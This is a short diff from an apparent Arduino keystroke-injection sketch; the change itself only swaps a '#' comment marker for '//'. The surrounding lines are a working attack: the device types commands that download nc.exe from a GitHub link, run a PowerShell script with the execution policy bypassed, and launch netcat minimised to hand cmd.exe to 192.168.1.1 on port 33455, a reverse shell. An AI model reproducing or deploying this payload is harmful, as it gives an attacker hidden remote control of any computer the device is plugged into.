@@ -20,7 +20,7 @@ void setup()
   Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'https://github.com/Ameg0/netcat/blob/master/nc.exe?raw=true' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));
   typeKey(KEY_RETURN);
   delay(50);
-  Keyboard.print(F("START /MIN a.exe 192.168.1.1 33455 -e cmd.exe -d & exit")); #host and port can later be changed
+  Keyboard.print(F("START /MIN a.exe 192.168.1.1 33455 -e cmd.exe -d & exit")); // host and port can later be changed
   typeKey(KEY_RETURN);
   Keyboard.end();
 }
